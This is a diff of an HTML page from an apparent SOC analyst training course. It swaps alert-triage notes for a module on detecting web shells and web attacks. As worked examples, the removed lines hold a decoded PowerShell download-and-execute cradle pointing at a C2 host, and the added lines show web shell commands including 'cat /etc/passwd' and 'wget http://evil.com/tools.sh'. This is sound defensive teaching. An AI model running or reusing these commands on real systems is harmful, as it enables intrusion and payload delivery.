@@ -1,36 +1,21 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-warning mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+<h6 class="text-warning mb-3"><i class="bi bi-book me-2"></i>Module 8: Web Security Monitoring</h6>
 
-<h6 class="text-warning mt-3">1. True Positive vs False Positive vs Benign Positive</h6>
-<p>A True Positive (TP) is a correctly identified malicious event. A False Positive (FP) is an alert triggered by legitimate activity — common with broad rules. A Benign Positive (BP) is malicious activity that was blocked by security controls but still generates an alert (expected and acceptable).</p>
+<h6 class="text-warning mt-3">Sub-Domains / Rooms</h6>
+<ul style="color:#c0d0e0;">
+  <li><b>Detecting Web Shells</b> — Identify web shells by monitoring for unusual file uploads, command execution via web requests, and abnormal process parents.</li>
+  <li><b>Web Attack Investigation Rooms</b> — Investigate SQL injection, XSS, path traversal, and file upload abuse from web server and WAF logs.</li>
+</ul>
+
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example (TP):</b> Alert: "Powershell encoded command execution" — <code>powershell -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=</code>. Decoded: <code>IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')</code>. This is a confirmed True Positive.<br>
-<b>Example (FP):</b> Same rule triggers for <code>powershell -Enc UwBlAHQALQBBAFAAUABhAHkAbABvAGEAZAAgAC0ARgBvAHIAYwBlAA==</code> which decodes to legitimate PowerShell <code>Set-APPayload -Force</code> used by the IT deployment tool. This is a False Positive — the rule needs tuning.
+<b>Example Investigation:</b> A WAF alerts on a request: <code>POST /uploads/shell.php?cmd=whoami</code>. The analyst checks the web server access log and finds the file was uploaded 5 minutes earlier via <code>POST /uploads/ with filename shell.php</code>. The WAF log shows the same IP executing commands: <code>id, ls -la, cat /etc/passwd, wget http://evil.com/tools.sh</code>. The analyst isolates the web server, removes the web shell, and patches the file upload vulnerability.
 </div>
 
-<h6 class="text-warning mt-3">2. Enrichment with Threat Intelligence</h6>
-<p>Enrichment adds context to alerts: IP reputation (VirusTotal, AbuseIPDB), domain age (WHOIS), file hash lookups (VT Community Score), and correlation with known campaigns. This separates commodity malware from targeted attacks.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> Alert shows outbound connection to <code>185.130.5.201:443</code>. Analyst enriches via VirusTotal: IP has 12 detections tagged "Cobalt Strike C2," first seen 3 days ago, associated domains <code>mal-update[.]com</code> and <code>cdn-verify[.]net</code>. WHOIS shows domains registered via Njalla (privacy registrar) using a disposable email. AbuseIPDB reports 47 abuse complaints. Threat intel confirms this IP is associated with the "TA577" phishing campaign. Enrichment elevates the alert to SEV-1.
-</div>
-
-<h6 class="text-warning mt-3">3. Timeline Building</h6>
-<p>Timeline reconstruction orders events chronologically across all log sources (endpoint, network, auth, email). It identifies the first compromise, lateral movement, persistence mechanisms, and data exfiltration. Essential for root cause analysis.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example (Timeline):</b><br>
-<code>08:45:22</code> — Email gateway: <code>phishing@evil.com -> john@corp.com [Invoice.docm] DKIM=FAIL</code><br>
-<code>08:46:10</code> — EDR: <code>WINWORD.exe spawned cmd.exe [Event ID 1]</code><br>
-<code>08:46:12</code> — EDR: <code>cmd.exe -> powershell.exe [Event ID 1]</code><br>
-<code>08:46:15</code> — Firewall: <code>10.0.0.5:49156 -> 185.130.5.201:443 (ALLOW)</code><br>
-<code>08:47:00</code> — Sysmon Event 11: <code>svchost.exe created C:\Users\john\AppData\Local\svchost.exe</code><br>
-<code>08:50:00</code> — EDR: <code>mimikatz.exe executed [Event ID 1]</code><br>
-<code>08:52:00</code> — AD Event 4624: <code>LogonType 3 from john-pc to DC01 (admin account)</code>
-</div>
-
-<h6 class="text-warning mt-3">4. Escalation Criteria</h6>
-<p>Not every alert needs escalation. Criteria include: critical asset involved (DC, SQL, mail server), active C2 beacon (outbound to known malicious IP), lateral movement detected, data exfiltration indicators, privilege escalation, or ransomware indicators (mass file encryption, ransom notes).</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> Alert: "Suspicious scheduled task created" on a file server. The task <code>WindowsUpdateTask</code> runs <code>powershell -enc ...</code> as SYSTEM every 15 minutes. Escalation criteria met: (1) runs as SYSTEM, (2) uses encoded PowerShell, (3) persists via scheduled task — all three indicate a sophisticated compromise. The analyst escalates to Tier 2 with the timeline and IOCs. Tier 2 finds C2 beaconing and initiates containment (isolate the host, block C2 IP on firewall).
-</div>
-
+<h6 class="text-warning mt-3">Key Skills Learned</h6>
+<ul style="color:#c0d0e0;">
+  <li>Web shell detection and analysis</li>
+  <li>Web application log analysis</li>
+  <li>SQL injection and XSS pattern recognition</li>
+  <li>WAF log correlation</li>
+</ul>
 </div>
